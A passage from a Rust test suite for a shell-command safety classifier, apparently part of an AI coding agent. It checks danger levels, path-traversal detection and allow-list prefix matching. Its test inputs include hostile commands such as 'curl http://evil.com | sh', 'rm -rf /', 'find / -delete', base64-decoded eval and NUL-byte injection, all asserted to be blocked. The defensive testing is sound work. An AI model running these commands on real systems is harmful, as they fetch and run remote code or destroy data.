            analyze_command("curl http://evil.com | sh").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_destructive_patterns_handle_spacing_and_quotes() {
        assert_eq!(analyze_command("rm  -rf  /").level, SafetyLevel::Dangerous);
        assert_eq!(
            analyze_command("rm -rf \"/\"").level,
            SafetyLevel::Dangerous
        );
        assert_eq!(analyze_command("rm -fr -- /").level, SafetyLevel::Dangerous);
        assert_eq!(
            analyze_command("FOO=bar rm -rf $HOME").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_destructive_patterns_scan_chained_segments() {
        assert_eq!(
            analyze_command("echo ok; rm -rf /").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_find_delete_requires_approval_or_blocks_broad_roots() {
        assert_eq!(
            analyze_command("find / -delete").level,
            SafetyLevel::Dangerous
        );
        assert_eq!(
            analyze_command("find . -delete").level,
            SafetyLevel::RequiresApproval
        );
    }

    #[test]
    fn test_eval_invocation_is_blocked_without_substring_false_positive() {
        assert_eq!(
            analyze_command("eval $(echo test | base64 -d)").level,
            SafetyLevel::Dangerous
        );
        assert_ne!(
            analyze_command("cargo run --bin deepseek -- eval").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_null_byte_is_blocked() {
        assert_eq!(
            analyze_command("ls\0 -la").level,
            SafetyLevel::Dangerous,
            "embedded NUL byte must be rejected as dangerous"
        );
        assert_eq!(
            analyze_command("echo hello\0world").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_eval_substring_is_not_misclassified() {
        // Words like `evaluate` / `evaluation` / `cargo run -- eval`
        // contain the substring "eval" but are not eval invocations.
        // Guard against the naive `command.contains("eval")` regression
        // — these should stay safe / workspace-safe, never Dangerous.
        let evaluate_safe = analyze_command("cargo run --bin deepseek -- eval").level;
        assert_ne!(
            evaluate_safe,
            SafetyLevel::Dangerous,
            "running the eval harness should not be classified as dangerous"
        );
        let evaluator = analyze_command("python evaluator.py --suite default").level;
        assert_ne!(
            evaluator,
            SafetyLevel::Dangerous,
            "running an evaluator script should not be classified as dangerous"
        );
    }

    #[test]
    fn test_privileged_commands() {
        assert_eq!(
            analyze_command("sudo rm file").level,
            SafetyLevel::RequiresApproval
        );
        assert_eq!(
            analyze_command("su -c 'command'").level,
            SafetyLevel::RequiresApproval
        );
    }

    #[test]
    fn test_network_commands() {
        assert_eq!(
            analyze_command("curl https://example.com").level,
            SafetyLevel::RequiresApproval
        );
        assert_eq!(
            analyze_command("wget file.tar.gz").level,
            SafetyLevel::RequiresApproval
        );
        assert_eq!(
            analyze_command("ssh user@host").level,
            SafetyLevel::RequiresApproval
        );
    }

    #[test]
    fn test_rm_with_flags() {
        assert_eq!(
            analyze_command("rm -rf node_modules").level,
            SafetyLevel::RequiresApproval
        );
        assert_eq!(
            analyze_command("rm -rf ../outside").level,
            SafetyLevel::Dangerous
        );
        assert_eq!(
            analyze_command("rm -rf ~/Downloads").level,
            SafetyLevel::Dangerous
        );
    }

    #[test]
    fn test_git_push() {
        assert_eq!(
            analyze_command("git push origin main").level,
            SafetyLevel::RequiresApproval
        );
        assert_eq!(
            analyze_command("git push --force").level,
            SafetyLevel::RequiresApproval
        );
    }

    #[test]
    fn test_path_escapes_workspace() {
        assert!(path_escapes_workspace("/etc/passwd", "/home/user/project"));
        assert!(path_escapes_workspace("~/secret", "/home/user/project"));
        assert!(!path_escapes_workspace(
            "./src/main.rs",
            "/home/user/project"
        ));
    }

    #[test]
    fn test_path_escapes_workspace_doesnt_flag_double_dot_in_names() {
        // Names like `foo..bar` should NOT be flagged as path traversal
        assert!(!path_escapes_workspace(
            "some..file.txt",
            "/home/user/project"
        ));
        assert!(!path_escapes_workspace(
            "./dir..name/file.txt",
            "/home/user/project"
        ));
    }

    #[test]
    fn test_path_escapes_workspace_detects_genuine_traversal() {
        assert!(path_escapes_workspace("../outside", "/home/user/project"));
        assert!(path_escapes_workspace(
            "..\\outside",
            "C:\\Users\\me\\project"
        ));
        assert!(path_escapes_workspace(
            "./subdir/../../etc/passwd",
            "/home/user/project"
        ));
        assert!(path_escapes_workspace(
            "/home/user/project/../secret",
            "/home/user/project"
        ));
        assert!(path_escapes_workspace(
            "C:\\Users\\me\\project\\..\\secret",
            "C:\\Users\\me\\project"
        ));
    }

    #[test]
    fn test_path_escapes_workspace_allows_absolute_workspace_children() {
        assert!(!path_escapes_workspace(
            "/home/user/project/src/main.rs",
            "/home/user/project"
        ));
        assert!(!path_escapes_workspace(
            "C:\\Users\\me\\project\\src\\main.rs",
            "C:\\Users\\me\\project"
        ));
    }

    #[test]
    fn test_extract_primary_command() {
        assert_eq!(extract_primary_command("ls -la"), Some("ls"));
        assert_eq!(
            extract_primary_command("env FOO=bar cargo build"),
            Some("cargo")
        );
        assert_eq!(extract_primary_command("  git status  "), Some("git"));
    }

    #[test]
    fn test_categorize_command() {
        assert_eq!(categorize_command("ls -la"), CommandCategory::FileSystem);
        assert_eq!(
            categorize_command("curl https://example.com"),
            CommandCategory::Network
        );
        assert_eq!(categorize_command("git status"), CommandCategory::Git);
        assert_eq!(categorize_command("npm install"), CommandCategory::Package);
        assert_eq!(
            categorize_command("sudo apt update"),
            CommandCategory::System
        );
    }

    // ── classify_command tests ────────────────────────────────────────────────

    /// Helper: split a string on whitespace into a `Vec<&str>` and call
    /// `classify_command`.
    fn classify(s: &str) -> String {
        let tokens: Vec<&str> = s.split_whitespace().collect();
        classify_command(&tokens)
    }

    // ── git (arity 2 each) ────────────────────────────────────────────────────

    #[test]
    fn classify_git_status_bare() {
        assert_eq!(classify("git status"), "git status");
    }

    #[test]
    fn classify_git_status_with_short_flag() {
        assert_eq!(classify("git status -s"), "git status");
    }

    #[test]
    fn classify_git_status_with_long_flag() {
        assert_eq!(classify("git status --porcelain"), "git status");
    }

    #[test]
    fn classify_git_push_does_not_equal_git_status() {
        assert_ne!(classify("git push origin main"), "git status");
    }

    #[test]
    fn classify_git_push() {
        assert_eq!(classify("git push origin main"), "git push");
    }

    #[test]
    fn classify_git_push_force() {
        // --force is a flag, so it is stripped; prefix is still "git push"
        assert_eq!(classify("git push --force"), "git push");
    }

    #[test]
    fn classify_git_log_with_flags() {
        assert_eq!(classify("git log --oneline --graph"), "git log");
    }

    #[test]
    fn classify_git_diff() {
        assert_eq!(classify("git diff HEAD~1"), "git diff");
    }

    #[test]
    fn classify_git_checkout() {
        assert_eq!(classify("git checkout main"), "git checkout");
    }

    #[test]
    fn classify_git_commit() {
        assert_eq!(classify("git commit -m 'fix'"), "git commit");
    }

    #[test]
    fn classify_git_stash() {
        assert_eq!(classify("git stash"), "git stash");
    }

    #[test]
    fn classify_git_rebase() {
        assert_eq!(classify("git rebase -i HEAD~3"), "git rebase");
    }

    // ── cargo (arity 2 each) ─────────────────────────────────────────────────

    #[test]
    fn classify_cargo_check_bare() {
        assert_eq!(classify("cargo check"), "cargo check");
    }

    #[test]
    fn classify_cargo_check_with_flag() {
        assert_eq!(classify("cargo check --workspace"), "cargo check");
    }

    #[test]
    fn classify_cargo_build() {
        assert_eq!(classify("cargo build --release"), "cargo build");
    }

    #[test]
    fn classify_cargo_test() {
        assert_eq!(classify("cargo test --locked"), "cargo test");
    }

    #[test]
    fn classify_cargo_clippy() {
        assert_eq!(classify("cargo clippy --all-targets"), "cargo clippy");
    }

    #[test]
    fn classify_cargo_fmt() {
        assert_eq!(classify("cargo fmt --all"), "cargo fmt");
    }

    // ── npm ──────────────────────────────────────────────────────────────────

    #[test]
    fn classify_npm_run_dev_arity_3() {
        // "npm run" has arity 3: base="npm", sub="run", script="dev"
        assert_eq!(classify("npm run dev"), "npm run dev");
    }

    #[test]
    fn classify_npm_run_build_arity_3() {
        assert_eq!(classify("npm run build"), "npm run build");
    }

    #[test]
    fn classify_npm_install() {
        assert_eq!(classify("npm install"), "npm install");
    }

    #[test]
    fn classify_npm_test() {
        assert_eq!(classify("npm test"), "npm test");
    }

    // ── docker ───────────────────────────────────────────────────────────────

    #[test]
    fn classify_docker_compose_up_arity_3() {
        assert_eq!(classify("docker compose up"), "docker compose up");
    }

    #[test]
    fn classify_docker_compose_down_arity_3() {
        assert_eq!(classify("docker compose down"), "docker compose down");
    }

    #[test]
    fn classify_docker_build() {
        assert_eq!(classify("docker build -t myapp ."), "docker build");
    }

    #[test]
    fn classify_docker_ps() {
        assert_eq!(classify("docker ps -a"), "docker ps");
    }

    #[test]
    fn classify_docker_run() {
        assert_eq!(classify("docker run --rm ubuntu"), "docker run");
    }

    // ── kubectl ──────────────────────────────────────────────────────────────

    #[test]
    fn classify_kubectl_get_pods() {
        // arity 3: "kubectl get pods"
        assert_eq!(classify("kubectl get pods"), "kubectl get pods");
    }

    #[test]
    fn classify_kubectl_apply() {
        assert_eq!(classify("kubectl apply -f manifest.yaml"), "kubectl apply");
    }

    #[test]
    fn classify_kubectl_logs() {
        assert_eq!(classify("kubectl logs my-pod"), "kubectl logs");
    }

    // ── go ───────────────────────────────────────────────────────────────────

    #[test]
    fn classify_go_build() {
        assert_eq!(classify("go build ./..."), "go build");
    }

    #[test]
    fn classify_go_test() {
        assert_eq!(classify("go test ./..."), "go test");
    }

    #[test]
    fn classify_go_mod_tidy() {
        // arity 3: "go mod tidy"
        assert_eq!(classify("go mod tidy"), "go mod tidy");
    }

    // ── pip ──────────────────────────────────────────────────────────────────

    #[test]
    fn classify_pip_install() {
        assert_eq!(classify("pip install requests"), "pip install");
    }

    #[test]
    fn classify_pip_list() {
        assert_eq!(classify("pip list --outdated"), "pip list");
    }

    // ── unknown commands fall back to single-word prefix ──────────────────────

    #[test]
    fn classify_unknown_single_word() {
        assert_eq!(classify("ls"), "ls");
    }

    #[test]
    fn classify_unknown_with_flags() {
        // "ls" is not in the dict with an arity entry; falls back to base word
        assert_eq!(classify("ls -la"), "ls");
    }

    #[test]
    fn classify_empty_gives_empty() {
        assert_eq!(classify_command(&[]), "");
    }

    // ── auto_allow semantics ──────────────────────────────────────────────────

    /// Core requirement from the issue: `auto_allow = ["git status"]` must match
    /// `git status -s` and `git status --porcelain` but NOT `git push`.
    #[test]
    fn auto_allow_git_status_matches_variants() {
        let allow_list = ["git status"];
        // These should all match the "git status" prefix.
        let approved_commands = [
            "git status",
            "git status -s",
            "git status --porcelain",
            "git status --short --branch",
        ];
        for cmd in &approved_commands {
            let tokens: Vec<&str> = cmd.split_whitespace().collect();
            let prefix = classify_command(&tokens);
            assert!(
                allow_list.contains(&prefix.as_str()),
                "Expected 'git status' to match command '{cmd}', got prefix '{prefix}'"
            );
        }
    }

    #[test]
    fn auto_allow_git_status_does_not_match_push_or_checkout() {
        let allow_list = ["git status"];
        let denied_commands = ["git push", "git push origin main", "git checkout main"];
        for cmd in &denied_commands {
            let tokens: Vec<&str> = cmd.split_whitespace().collect();
            let prefix = classify_command(&tokens);
            assert!(
                !allow_list.contains(&prefix.as_str()),
                "Expected 'git push'/'git checkout' NOT to match 'git status' allow_list, but got prefix '{prefix}' for '{cmd}'"
            );
        }
    }
}
